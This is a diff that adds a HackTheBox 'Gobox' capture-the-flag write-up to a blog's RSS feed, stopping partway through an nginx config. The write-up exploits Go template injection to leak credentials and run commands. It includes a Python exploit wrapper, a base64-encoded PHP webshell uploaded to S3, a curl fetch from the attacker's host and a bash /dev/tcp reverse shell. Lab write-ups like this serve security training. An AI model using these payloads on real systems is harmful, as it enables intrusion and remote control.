@@ -5,7 +5,572 @@
     <link>https://fahmifj.github.io/tags/webshell/</link>
     <description>Recent content in Webshell on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 07 Aug 2021 21:07:15 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/webshell/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/webshell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Gobox</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
+      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</guid>
+      <description>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container.</description>
+      <content:encoded><![CDATA[<p>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container. This container can communicate with S3 bucket (using LocalStack) and has write permission on it, allowing me to drop a web shell to gain a foothold on the host system. Further enumeration on the host discovers a NGINX backdoor which can be used to escalate to root.</p>
+<p>On the explore section, I&rsquo;m digging into the request routing of this machine.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>SSTI in Golang</li>
+<li>Source Code Analysis</li>
+<li>Scripting</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ fscan 10.10.11.113 gobox
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.113
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    nginx
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
+8080/tcp open  http    nginx
+<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
+<p>The site on port 80 is a kind of Hacking eSports homepage.</p>
+<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
+</p>
+<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog uses Go).</p>
+<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
+</p>
+<p>Nothing else to see here.</p>
+<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
+<p>On port 8080, it shows a login page.</p>
+<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
+</p>
+<p>When an email and a password is submitted, it outputs nothing.</p>
+<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ curl -s -I http://10.10.11.113:8080       
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx
+Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
+Connection: keep-alive
+X-Forwarded-Server: golang
+</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
+<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
+</p>
+<p>The following is how the HTTP request and the HTTP response look like.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="container-root">Container root</h3>
+<h4 id="ssti">SSTI</h4>
+<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
+</code></pre></div><p>And the site is vulnerable to SSTI! It returns an email address: <code>ippsec@hacking.esports</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
+</p>
+<p>When <code>{{.}}</code> is submitted, it spits out all the available properties value.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
+</p>
+<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
+<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
+</p>
+<h4 id="rce">RCE</h4>
+<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
+<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="o">...</span>
+</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
+<p>For example <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
+</p>
+<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
+<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
+</p>
+<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">cmd</span>
+<span class="kn">import</span> <span class="nn">html</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="c1"># hacky curly braces</span>
+<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
+<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
+	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+
+<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
+	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>
+
+	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
+		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
+	<span class="k">try</span><span class="p">:</span>	
+		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
+	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>Using that wrapper, I have ability to send command from CLI to the compromised container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
+$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+&gt; uname -a
+Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+&gt; ls -la
+total <span class="m">8692</span>
+drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 .
+drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 ..
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">8876980</span> Aug <span class="m">24</span> 19:04 main
+drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 18:26 templates
+</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="s3-enumeration">S3 enumeration</h4>
+<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
+&gt; aws 
+usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
+To see <span class="nb">help</span> text, you can run:
+
+  aws <span class="nb">help</span>
+  aws &lt;command&gt; <span class="nb">help</span>
+  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
+aws: error: the following arguments are required: <span class="nb">command</span>
+</code></pre></div><p>Using enumeration skills I gained from <a href="http://localhost:1313/writeups/hackthebox/htb-bucket/">HTB Bucket</a>, I send <code>aws s3 ls</code> to see the available S3 buckets, and there is one called <code>website</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
+2021-09-07 07:32:42 website
+</code></pre></div><p>The bucket contains 4 files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
+PRE css/
+2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
+2021-09-07 07:32:42     <span class="m">165551</span> header.png
+2021-09-07 07:32:42          <span class="m">5</span> index.html
+2021-09-07 07:32:42       <span class="m">1803</span> index.php
+</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
+download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
+&gt; cat /tmp/id.php
+&lt;!DOCTYPE html&gt;
+&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+
+&lt;head&gt;
+  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
+  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I also find that I have write access on this bucket.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+&gt; aws s3 cp /tmp/iamf.php s3://website/
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+</code></pre></div><p>When I visit back <code>10.10.11.113/iamf.php</code>, my file is there! And instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ..</code>, and that means the homepage is hosted in a different system.</p>
+<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
+</p>
+<h4 id="webshell">Webshell</h4>
+<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
+$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
+PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
+</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
+
+&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
+upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
+</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
+<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>This time the system has several Linux binary such as <code>curl</code> that I can use to get a foothold. First, I will craft my reverse shell script and host it afterwards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
+bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
+</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
+</code></pre></div><p>Now I will get my listener ready and execute the script.</p>
+<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
+</p>
+<p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@gobox:/opt/website$
+</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@gobox:/opt/website$ ^Z
+<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «gobox» «10.10.14.97»
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
+www-data@gobox:/opt/website$
+</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+www-data@gobox:/$ ls -lR /home/ubuntu
+/home/ubuntu:
+total <span class="m">4</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
+www-data@gobox:/$ cat /home/ubuntu/user.txt
+d6b916265fd4a984d17db028a3a729f0
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this on the explore section).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
+
+
+        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>
+
+        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>
+
+        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>
+
+
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
+                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1"># Homepage
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
+        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
+        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
+
+        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
+            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>
+
+
+            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># Login page
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
+        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># unknown
